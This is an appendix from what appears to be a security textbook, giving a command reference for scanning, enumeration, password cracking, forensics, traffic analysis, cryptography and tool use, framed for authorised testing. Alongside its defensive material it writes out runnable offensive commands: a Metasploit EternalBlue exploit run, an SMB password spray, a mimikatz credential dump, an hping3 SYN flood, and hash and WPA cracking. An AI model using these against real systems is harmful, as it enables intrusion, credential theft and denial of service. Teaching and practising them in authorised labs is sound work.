# Appendix A: Security Command Reference

This appendix provides a concise reference for command-line tools used throughout the book.
All commands should be run only on systems you own or are explicitly authorised to test.

---

## Network Scanning and Enumeration

### Nmap

```bash
# SYN scan all ports with service/version and OS detection
nmap -sS -sV -O -p- -T4 <target>

# Aggressive scan with NSE default scripts
nmap -A -p 80,443,22,21,3389 <target>

# Run specific NSE scripts
nmap --script smb-enum-shares,smb-enum-users <target>
nmap --script ssl-cert,ssl-enum-ciphers -p 443 <target>

# Save output in all formats
nmap -sV -oA scan_results <target>

# UDP scan (top 100 UDP ports)
nmap -sU --top-ports 100 <target>

# Decoy scan (blend with decoys)
nmap -sS -D RND:10 <target>
```

### DNS Enumeration

```bash
# Basic record lookups
dig A target.com
dig MX target.com
dig TXT target.com
dig NS target.com

# Zone transfer attempt
dig AXFR @ns1.target.com target.com

# DNSSEC validation
dig +dnssec A target.com

# Reverse lookup
dig -x 203.0.113.10
```

### Web Enumeration

```bash
# Directory brute-force
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# Parameter fuzzing
ffuf -u "http://target.com/page?FUZZ=value" -w params.txt

# Virtual host enumeration
gobuster vhost -u http://target.com -w subdomains.txt
```

---

## Password and Credential Tools

```bash
# Offline hash cracking
hashcat -m 0 hashes.txt rockyou.txt              # MD5
hashcat -m 1000 hashes.txt rockyou.txt            # NTLM
hashcat -m 3200 hashes.txt rockyou.txt            # bcrypt

# Online password spray (authorised testing only)
crackmapexec smb <target_subnet> -u users.txt -p 'Password123' --continue-on-success

# Extract hashes from memory (Windows; requires admin)
# mimikatz: sekurlsa::logonpasswords
```

---

## Forensics

```bash
# Create forensic image
dd if=/dev/sdb of=disk.img bs=4M status=progress conv=sync,noerror
dcfldd if=/dev/sdb of=disk.img hash=sha256 hashlog=hash.log

# Hash verification
sha256sum disk.img

# File type identification
file unknown_file
xxd unknown_file | head -4    # View magic bytes

# String extraction
strings -a -n 8 binary_file > strings.txt

# Entropy estimation (via binwalk)
binwalk -E file.bin

# File carving
binwalk -e archive.bin
foremost -i disk.img -o recovered/

# Memory forensics
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.netscan
volatility3 -f memory.dmp windows.malfind
```

---

## Network Analysis

```bash
# Capture traffic
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80 -A      # HTTP in ASCII

# Filter in Wireshark / tshark
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name

# NetFlow (if yaf installed)
yaf --in=eth0 --out=flow.ipfix
```

---

## Cryptography

```bash
# Generate keys and certificates
openssl genrsa -out private.key 4096
openssl req -new -x509 -key private.key -out cert.pem -days 365
openssl s_client -connect target.com:443 -showcerts

# Hashing
echo -n "hello" | sha256sum
openssl dgst -sha256 file.txt

# File encryption with AES-256-GCM
openssl enc -aes-256-gcm -salt -in plaintext.txt -out encrypted.bin
openssl enc -d -aes-256-gcm -in encrypted.bin -out decrypted.txt

# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 target.com
testssl.sh target.com
```

---

## Python One-Liners

```python
# Base64 encode/decode
python3 -c "import base64; print(base64.b64encode(b'hello').decode())"
python3 -c "import base64; print(base64.b64decode('aGVsbG8=').decode())"

# SHA-256 hash
python3 -c "import hashlib; print(hashlib.sha256(b'hello').hexdigest())"

# Simple HTTP server
python3 -m http.server 8080

# Quick port check
python3 -c "import socket; s=socket.socket(); s.settimeout(1); print(s.connect_ex(('target.com',443)))"
```


## Security Tools Reference

This section catalogs widely used security tools, the chapter where each is discussed, and a
representative command. Run these only against systems you own or are explicitly authorized to test.

### Metasploit Framework (exploitation -- Chapter 9)
An exploitation framework that bundles exploits, payloads, and post-exploitation modules.

```bash
msfconsole                          # launch the console
search type:exploit smb             # find SMB exploits
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5; set LHOST 10.10.14.2
exploit                             # run against an authorized target
```

### Wireshark / tshark (packet analysis -- Chapters 3, 8)
A graphical and command-line packet analyzer for inspecting captured traffic.

```bash
tshark -i eth0 -f "tcp port 80"     # live capture, capture filter
wireshark capture.pcap              # open a capture; display filter e.g. ip.addr==10.0.0.5 && tcp.flags.syn==1
```

### hping3 (packet crafting / testing -- Chapters 3, 8)
A command-line TCP/IP packet assembler and analyzer used for crafting custom packets and load testing.

```bash
sudo hping3 -S -p 80 --flood 10.0.0.5   # SYN flood test (authorized lab only)
sudo hping3 -1 10.0.0.5                  # ICMP mode (like ping)
```

### LOIC (Low Orbit Ion Cannon) (DoS demonstration -- Chapter 3)
An open-source stress-testing tool historically misused for denial-of-service. Discussed for awareness;
using it against systems without permission is illegal. Use only in an isolated lab you control.

### Nmap (scanning and mapping -- Chapters 7, 8)
The standard network scanner for host discovery, port scanning, and service/OS detection.

```bash
nmap -sS -sV -O -p- -T4 10.0.0.0/24     # SYN scan, versions, OS, all ports
nmap --script vuln 10.0.0.5             # NSE vulnerability scripts
```

### John the Ripper (password cracking -- Chapters 9, 12)
A versatile offline password cracker supporting many hash formats.

```bash
john --format=sha512crypt --wordlist=rockyou.txt hashes.txt
john --show hashes.txt                   # display cracked passwords
```

### Hashcat (GPU password cracking -- Chapters 9, 12)
A high-performance, GPU-accelerated password recovery tool.

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt     # dictionary attack on NTLM
hashcat -m 22000 -a 3 wpa.hc22000 '?d?d?d?d?d?d?d?d'  # mask/brute-force on WPA
```

### Aircrack-ng (wireless auditing -- Chapters 3, 16)
A suite for assessing Wi-Fi security: capturing handshakes and cracking WEP/WPA keys.

```bash
airmon-ng start wlan0                     # enable monitor mode
airodump-ng wlan0mon                      # capture; record the WPA handshake
aircrack-ng -w rockyou.txt -b <BSSID> capture.cap
```

### Snort (intrusion detection/prevention -- Chapters 12, 17)
An open-source signature-based network IDS/IPS for real-time traffic analysis and alerting.

```bash
sudo snort -T -c /etc/snort/snort.conf            # test configuration
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0   # run IDS, alerts to console
# local.rules example:
alert tcp any any -> $HOME_NET 22 (msg:"SSH connection attempt"; sid:1000001;)
```

### Zeek (network security monitoring -- Chapters 12, 17)
A network analysis framework (formerly Bro) that produces rich, structured logs of network activity for
threat hunting and forensics, complementing signature IDS with behavioral visibility.

```bash
zeek -i eth0                              # live monitoring; writes conn.log, dns.log, http.log, etc.
zeek -r capture.pcap                      # analyze a saved capture
cat conn.log | zeek-cut id.orig_h id.resp_h service duration
```

### pfSense (firewall / router -- Chapters 11, 17)
An open-source firewall and router platform (FreeBSD-based) providing stateful filtering, VPN (IPsec,
OpenVPN, WireGuard), NAT, and traffic shaping, often used as a network's perimeter or segmentation
control. Configured through a web interface; commonly paired with Snort or Suricata packages for
inline intrusion prevention and with pfBlockerNG for DNS and IP filtering.

```{note}
Defensive platforms such as pfSense, Snort, and Zeek are how the attacks elsewhere in this book are
detected and contained. A common teaching lab pairs an attacker host (Kali with Metasploit, Nmap,
hping3, Aircrack-ng) against a defended network (pfSense firewall, Snort/Zeek monitoring), so students
see both sides of every technique.
```
